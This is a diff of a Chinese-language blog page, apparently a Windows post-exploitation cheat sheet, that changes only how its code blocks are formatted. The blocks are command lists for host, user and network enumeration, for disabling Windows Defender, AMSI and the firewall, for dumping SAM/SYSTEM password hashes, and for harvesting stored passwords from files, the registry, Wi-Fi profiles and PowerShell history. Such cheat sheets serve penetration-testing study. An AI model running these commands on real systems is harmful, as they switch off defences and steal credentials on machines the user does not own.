@@ -253,443 +253,58 @@
 
 <span id="more"></span>
 <hr>
-<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><h3 id="1-基础信息"><a href="#1-基础信息" class="headerlink" title="1. 基础信息"></a>1. 基础信息</h3><pre><code>1）版本配置信息
+<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><h3 id="1-基础信息"><a href="#1-基础信息" class="headerlink" title="1. 基础信息"></a>1. 基础信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">1）版本配置信息</span><br><span class="line"></span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"></span><br><span class="line">wmic qfe  # 补丁更新信息</span><br><span class="line"></span><br><span class="line">wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%  # 体系架构</span><br><span class="line"></span><br><span class="line">set  # 环境变量</span><br><span class="line">Get-ChildItem Env: | ft Key,Value</span><br><span class="line"></span><br><span class="line">wmic logicaldisk get caption || fsutil fsinfo drives   # 驱动信息</span><br><span class="line">wmic logicaldisk get caption,description,providername</span><br><span class="line">Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root</span><br><span class="line"></span><br><span class="line">2）用户枚举</span><br><span class="line"></span><br><span class="line">echo %USERNAME% || whoami  # 获取当前用户名</span><br><span class="line">$env:username</span><br><span class="line"></span><br><span class="line">whoami /priv  # 查看用户权限</span><br><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line">net user      # 列举所有用户</span><br><span class="line">whoami /all</span><br><span class="line">Get-LocalUser | ft Name,Enabled,LastLogon</span><br><span class="line">Get-ChildItem C:\Users -Force | select Name</span><br><span class="line"></span><br><span class="line">net accounts  # 查看登录限制</span><br><span class="line"></span><br><span class="line">net user administrator  # 获取用户详细信息</span><br><span class="line">net user admin</span><br><span class="line">net user %USERNAME%</span><br><span class="line"></span><br><span class="line">net localgroup          # 枚举本地用户组</span><br><span class="line">Get-LocalGroup | ft Name</span><br><span class="line"></span><br><span class="line">net localgroup administrators  # 查看用户组详细信息</span><br><span class="line">Get-LocalGroupMember Administrators | ft Name, PrincipalSource</span><br><span class="line">Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource</span><br><span class="line"></span><br><span class="line">nltest /DCLIST:DomainName  # 枚举域控用户</span><br><span class="line">nltest /DCNAME:DomainName</span><br><span class="line">nltest /DSGETDC:DomainName</span><br><span class="line"></span><br><span class="line">3）网络枚举</span><br><span class="line"></span><br><span class="line">ipconfig /all   # 查看网络网卡、ip、DNS信息</span><br><span class="line">Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address</span><br><span class="line">Get-DnsClientServerAddress -AddressFamily IPv4 | ft</span><br><span class="line"></span><br><span class="line">route print     # 查看当前路由表信息</span><br><span class="line">Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex</span><br><span class="line"></span><br><span class="line">arp -A  # 查看ARP信息</span><br><span class="line">Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State</span><br><span class="line"></span><br><span class="line">netstat -ano # 查看当前连接</span><br><span class="line"></span><br><span class="line">net share   # 查看网络共享信息</span><br><span class="line">powershell Find-DomainShare -ComputerDomain domain.local</span><br><span class="line"></span><br><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s  # SNMP配置信息</span><br><span class="line">Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse</span><br><span class="line"></span><br><span class="line">4）杀软信息</span><br><span class="line"></span><br><span class="line">a. Windows Defender</span><br><span class="line"></span><br><span class="line"># check status of Defender</span><br><span class="line">PS C:\&gt; Get-MpComputerStatus</span><br><span class="line"></span><br><span class="line"># disable scanning all downloaded files and attachments, disable AMSI (reactive)</span><br><span class="line">PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus</span><br><span class="line">PS C:\&gt; Set-MpPreference -DisableIOAVProtection $true</span><br><span class="line"></span><br><span class="line"># disable AMSI (set to 0 to enable)</span><br><span class="line">PS C:\&gt; Set-MpPreference -DisableScriptScanning 1 </span><br><span class="line"></span><br><span class="line"># exclude a folder</span><br><span class="line">PS C:\&gt; Add-MpPreference -ExclusionPath &quot;C:\Temp&quot;</span><br><span class="line">PS C:\&gt; Add-MpPreference -ExclusionPath &quot;C:\Windows\Tasks&quot;</span><br><span class="line">PS C:\&gt; Set-MpPreference -ExclusionProcess &quot;word.exe&quot;, &quot;vmwp.exe&quot;</span><br><span class="line"></span><br><span class="line"># remove signatures (if Internet connection is present, they will be downloaded again):</span><br><span class="line">PS &gt; &amp; &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot; -RemoveDefinitions -All</span><br><span class="line">PS &gt; &amp; &quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot; -RemoveDefinitions -All</span><br><span class="line"></span><br><span class="line">b. Firewall</span><br><span class="line"></span><br><span class="line"># 列举防火墙状态和配置</span><br><span class="line">netsh advfirewall firewall dump</span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line"># 列举防火墙封禁端口</span><br><span class="line">$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where &#123;$_.action -eq &quot;0&quot;&#125; | select name,applicationname,localports</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server&quot;  /v fDenyTSConnections /t REG_DWORD /d 0 /f  # Win7 环境</span><br><span class="line"></span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -command &#x27;Set-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Terminal Server&quot; -Name &quot;fDenyTSConnections&quot; –Value&#x27;`</span><br><span class="line"></span><br><span class="line">netsh firewall set opmode disable   # 所有环境</span><br><span class="line">netsh Advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">c. AppLocker枚举</span><br><span class="line"></span><br><span class="line">PowerView PS C:\&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span><br><span class="line"></span><br><span class="line">d. 默认可写文件</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\Windows\System32\spool\drivers\color</span><br><span class="line">C:\Windows\System32\spool\printers</span><br><span class="line">C:\Windows\System32\spool\servers</span><br><span class="line">C:\Windows\tracing</span><br><span class="line">C:\Windows\Temp</span><br><span class="line">C:\Users\Public</span><br><span class="line">C:\Windows\Tasks</span><br><span class="line">C:\Windows\System32\tasks</span><br><span class="line">C:\Windows\SysWOW64\tasks</span><br><span class="line">C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system</span><br><span class="line">C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system</span><br><span class="line">C:\Windows\debug\wia</span><br><span class="line">C:\Windows\registration\crmlog</span><br><span class="line">C:\Windows\System32\com\dmp</span><br><span class="line">C:\Windows\SysWOW64\com\dmp</span><br><span class="line">C:\Windows\System32\fxstmp</span><br><span class="line">C:\Windows\SysWOW64\fxstmp</span><br></pre></td></tr></table></figure>
 
-systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
+<h3 id="2-密码信息"><a href="#2-密码信息" class="headerlink" title="2. 密码信息"></a>2. 密码信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">1）SAM/SYSTEM文件</span><br><span class="line"></span><br><span class="line"># Usually %SYSTEMROOT% = C:\Windows # 文件所在位置</span><br><span class="line">%SYSTEMROOT%\repair\SAM</span><br><span class="line">%SYSTEMROOT%\System32\config\RegBack\SAM</span><br><span class="line">%SYSTEMROOT%\System32\config\SAM</span><br><span class="line">%SYSTEMROOT%\repair\system</span><br><span class="line">%SYSTEMROOT%\System32\config\SYSTEM</span><br><span class="line">%SYSTEMROOT%\System32\config\RegBack\system</span><br><span class="line"></span><br><span class="line"># 导出hash文件</span><br><span class="line">pwdump SYSTEM SAM &gt; /root/sam.txt</span><br><span class="line">samdump2 SYSTEM SAM -o sam.txt</span><br><span class="line"></span><br><span class="line">2）文件内容查找</span><br><span class="line"></span><br><span class="line">cd C:\ &amp; findstr /SI /M &quot;password&quot; *.xml *.ini *.txt</span><br><span class="line">findstr /si password *.xml *.ini *.txt *.config</span><br><span class="line">findstr /spin &quot;password&quot; *.*</span><br><span class="line">dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</span><br><span class="line">where /R C:\ user.txt</span><br><span class="line">where /R C:\ *.ini</span><br><span class="line"></span><br><span class="line">3）从注册表查找</span><br><span class="line"></span><br><span class="line">REG QUERY HKLM /F &quot;password&quot; /t REG_SZ /S /K</span><br><span class="line">REG QUERY HKCU /F &quot;password&quot; /t REG_SZ /S /K</span><br><span class="line"></span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; # Windows Autologin</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot; </span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot; # SNMP parameters</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; # Putty clear text proxy credentials</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot; # VNC credentials</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password</span><br><span class="line"></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br><span class="line"></span><br><span class="line">REG QUERY &quot;HKLM\Software\Microsoft\FTH&quot; /V RuleList</span><br><span class="line"></span><br><span class="line">4）从xml文件查找</span><br><span class="line"></span><br><span class="line"># unattend.xml文件位置</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br><span class="line"></span><br><span class="line">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul # 查找</span><br><span class="line"></span><br><span class="line">5）IIS Web配置</span><br><span class="line"></span><br><span class="line">Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line">6）其他配置文件</span><br><span class="line"></span><br><span class="line">%SYSTEMDRIVE%\pagefile.sys</span><br><span class="line">%WINDIR%\debug\NetSetup.log</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\iis6.log</span><br><span class="line">%WINDIR%\system32\config\AppEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br><span class="line">%WINDIR%\system32\CCM\logs\*.log</span><br><span class="line">%USERPROFILE%\ntuser.dat</span><br><span class="line">%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat</span><br><span class="line">%WINDIR%\System32\drivers\etc\hosts</span><br><span class="line">C:\ProgramData\Configs\*</span><br><span class="line">C:\Program Files\Windows PowerShell\*</span><br><span class="line">dir c:*vnc.ini /s /b</span><br><span class="line">dir c:*ultravnc.ini /s /b</span><br><span class="line"></span><br><span class="line">7）Wifi密码查找</span><br><span class="line"></span><br><span class="line">netsh wlan show profile   # AP SSID</span><br><span class="line"></span><br><span class="line">netsh wlan show profile &lt;SSID&gt; key=clear  # Cleartext Pass</span><br><span class="line"></span><br><span class="line">cls &amp; echo. &amp; for /f &quot;tokens=4 delims=: &quot; %a in (&#x27;netsh wlan show profiles ^| find &quot;Profile &quot;&#x27;) do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr &quot;SSID Cipher Content&quot; | find /v &quot;Number&quot; &amp; echo.) &amp; @echo on</span><br><span class="line"></span><br><span class="line">8）粘贴版密码</span><br><span class="line"></span><br><span class="line">所在位置：C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</span><br><span class="line"></span><br><span class="line">9）存储用户密码查看</span><br><span class="line"></span><br><span class="line">rundll32 keymgr,KRShowKeyMgr</span><br><span class="line"></span><br><span class="line">10）Powershell历史命令</span><br><span class="line"></span><br><span class="line">关闭命令：Set-PSReadlineOption -HistorySaveStyle SaveNothing</span><br><span class="line"></span><br><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath | sls passw</span><br><span class="line"></span><br><span class="line">11）数据流密码获取</span><br><span class="line"></span><br><span class="line">PS &gt; Get-Item -path flag.txt -Stream *</span><br><span class="line">PS &gt; Get-Content -path flag.txt -Stream Flag</span><br></pre></td></tr></table></figure>
 
-wmic qfe  # 补丁更新信息
+<h3 id="3-进程-x2F-服务信息"><a href="#3-进程-x2F-服务信息" class="headerlink" title="3. 进程&#x2F;服务信息"></a>3. 进程&#x2F;服务信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">1）查看运行进程</span><br><span class="line"></span><br><span class="line">tasklist /v</span><br><span class="line">net start</span><br><span class="line">sc query</span><br><span class="line">Get-Service</span><br><span class="line">Get-Process</span><br><span class="line">Get-WmiObject -Query &quot;Select * from Win32_Process&quot; | where &#123;$_.Name -notlike &quot;svchost*&quot;&#125; | Select Name, Handle, @&#123;Label=&quot;Owner&quot;;Expression=&#123;$_.GetOwner().User&#125;&#125; | ft -AutoSize</span><br><span class="line"></span><br><span class="line">2）查看system服务进程</span><br><span class="line"></span><br><span class="line">tasklist /v /fi &quot;username eq system&quot;</span><br><span class="line"></span><br><span class="line">3）列举已安装程序</span><br><span class="line"></span><br><span class="line">Get-ChildItem &#x27;C:\Program Files&#x27;, &#x27;C:\Program Files (x86)&#x27; | ft Parent,Name,LastWriteTime</span><br><span class="line">Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</span><br><span class="line"></span><br><span class="line">4）列举services</span><br><span class="line"></span><br><span class="line">net start</span><br><span class="line">wmic service list brief</span><br><span class="line">tasklist /SVC</span><br><span class="line"></span><br><span class="line">5）列举计划任务</span><br><span class="line"></span><br><span class="line">schtasks /query /fo LIST 2&gt;nul | findstr TaskName</span><br><span class="line">schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM</span><br><span class="line">Get-ScheduledTask | where &#123;$_.TaskPath -notlike &quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State</span><br><span class="line"></span><br><span class="line">6）查看自启动任务</span><br><span class="line"></span><br><span class="line">wmic startup get caption,command</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="line">dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure>
 
-wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%  # 体系架构
-
-set  # 环境变量
-Get-ChildItem Env: | ft Key,Value
-
-wmic logicaldisk get caption || fsutil fsinfo drives   # 驱动信息
-wmic logicaldisk get caption,description,providername
-Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root
-
-2）用户枚举
-
-echo %USERNAME% || whoami  # 获取当前用户名
-$env:username
-
-whoami /priv  # 查看用户权限
-whoami /groups
-
-net user      # 列举所有用户
-whoami /all
-Get-LocalUser | ft Name,Enabled,LastLogon
-Get-ChildItem C:\Users -Force | select Name
-
-net accounts  # 查看登录限制
-
-net user administrator  # 获取用户详细信息
-net user admin
-net user %USERNAME%
-
-net localgroup          # 枚举本地用户组
-Get-LocalGroup | ft Name
-
-net localgroup administrators  # 查看用户组详细信息
-Get-LocalGroupMember Administrators | ft Name, PrincipalSource
-Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
-
-nltest /DCLIST:DomainName  # 枚举域控用户
-nltest /DCNAME:DomainName
-nltest /DSGETDC:DomainName
-
-3）网络枚举
-
-ipconfig /all   # 查看网络网卡、ip、DNS信息
-Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
-Get-DnsClientServerAddress -AddressFamily IPv4 | ft
-
-route print     # 查看当前路由表信息
-Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
-
-arp -A  # 查看ARP信息
-Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
-
-netstat -ano # 查看当前连接
-
-net share   # 查看网络共享信息
-powershell Find-DomainShare -ComputerDomain domain.local
-
-reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s  # SNMP配置信息
-Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
-
-4）杀软信息
-
-a. Windows Defender
-
-# check status of Defender
-PS C:\&gt; Get-MpComputerStatus
-
-# disable scanning all downloaded files and attachments, disable AMSI (reactive)
-PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
-PS C:\&gt; Set-MpPreference -DisableIOAVProtection $true
-
-# disable AMSI (set to 0 to enable)
-PS C:\&gt; Set-MpPreference -DisableScriptScanning 1 
-
-# exclude a folder
-PS C:\&gt; Add-MpPreference -ExclusionPath &quot;C:\Temp&quot;
-PS C:\&gt; Add-MpPreference -ExclusionPath &quot;C:\Windows\Tasks&quot;
-PS C:\&gt; Set-MpPreference -ExclusionProcess &quot;word.exe&quot;, &quot;vmwp.exe&quot;
-
-# remove signatures (if Internet connection is present, they will be downloaded again):
-PS &gt; &amp; &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot; -RemoveDefinitions -All
-PS &gt; &amp; &quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot; -RemoveDefinitions -All
-
-b. Firewall
-
-# 列举防火墙状态和配置
-netsh advfirewall firewall dump
-netsh firewall show state
-netsh firewall show config
-
-# 列举防火墙封禁端口
-$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where &#123;$_.action -eq &quot;0&quot;&#125; | select name,applicationname,localports
-
-# 关闭防火墙
-reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server&quot;  /v fDenyTSConnections /t REG_DWORD /d 0 /f  # Win7 环境
-
-powershell.exe -ExecutionPolicy Bypass -command &#39;Set-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Terminal Server&quot; -Name &quot;fDenyTSConnections&quot; –Value&#39;`
-
-netsh firewall set opmode disable   # 所有环境
-netsh Advfirewall set allprofiles state off
-
-c. AppLocker枚举
-
-PowerView PS C:\&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-
-d. 默认可写文件
-
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
-C:\Windows\System32\spool\drivers\color
-C:\Windows\System32\spool\printers
-C:\Windows\System32\spool\servers
-C:\Windows\tracing
-C:\Windows\Temp
-C:\Users\Public
-C:\Windows\Tasks
-C:\Windows\System32\tasks
-C:\Windows\SysWOW64\tasks
-C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
-C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
-C:\Windows\debug\wia
-C:\Windows\registration\crmlog
-C:\Windows\System32\com\dmp
-C:\Windows\SysWOW64\com\dmp
-C:\Windows\System32\fxstmp
-C:\Windows\SysWOW64\fxstmp
-</code></pre>
-<h3 id="2-密码信息"><a href="#2-密码信息" class="headerlink" title="2. 密码信息"></a>2. 密码信息</h3><pre><code>1）SAM/SYSTEM文件
-
-# Usually %SYSTEMROOT% = C:\Windows # 文件所在位置
-%SYSTEMROOT%\repair\SAM
-%SYSTEMROOT%\System32\config\RegBack\SAM
-%SYSTEMROOT%\System32\config\SAM
-%SYSTEMROOT%\repair\system
-%SYSTEMROOT%\System32\config\SYSTEM
-%SYSTEMROOT%\System32\config\RegBack\system
-
-# 导出hash文件
-pwdump SYSTEM SAM &gt; /root/sam.txt
-samdump2 SYSTEM SAM -o sam.txt
-
-2）文件内容查找
-
-cd C:\ &amp; findstr /SI /M &quot;password&quot; *.xml *.ini *.txt
-findstr /si password *.xml *.ini *.txt *.config
-findstr /spin &quot;password&quot; *.*
-dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
-where /R C:\ user.txt
-where /R C:\ *.ini
-
-3）从注册表查找
-
-REG QUERY HKLM /F &quot;password&quot; /t REG_SZ /S /K
-REG QUERY HKCU /F &quot;password&quot; /t REG_SZ /S /K
-
-reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; # Windows Autologin
-reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot; 
-reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot; # SNMP parameters
-reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; # Putty clear text proxy credentials
-reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot; # VNC credentials
-reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
-
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-
-REG QUERY &quot;HKLM\Software\Microsoft\FTH&quot; /V RuleList
-
-4）从xml文件查找
-
-# unattend.xml文件位置
-C:\unattend.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\system32\sysprep.inf
-C:\Windows\system32\sysprep\sysprep.xml
-
-dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul # 查找
-
-5）IIS Web配置
-
-Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
-
-6）其他配置文件
-
-%SYSTEMDRIVE%\pagefile.sys
